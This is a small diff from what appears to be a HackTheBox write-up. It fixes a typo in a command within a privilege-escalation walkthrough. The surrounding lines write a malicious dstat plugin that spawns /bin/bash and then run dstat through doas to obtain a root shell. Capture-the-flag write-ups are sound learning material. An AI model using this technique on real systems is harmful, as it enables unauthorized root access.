@@ -73,7 +73,7 @@ cat /usr/local/etc/doas.conf
 man dstat
 ls -ld /usr/local/share/dstat
 echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
-doas /usr/bin/dstat –list
+doas /usr/bin/dstat --list
 doas /usr/bin/dstat --pwn
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/90eed874-4f01-4e17-894d-5755485f29a7)
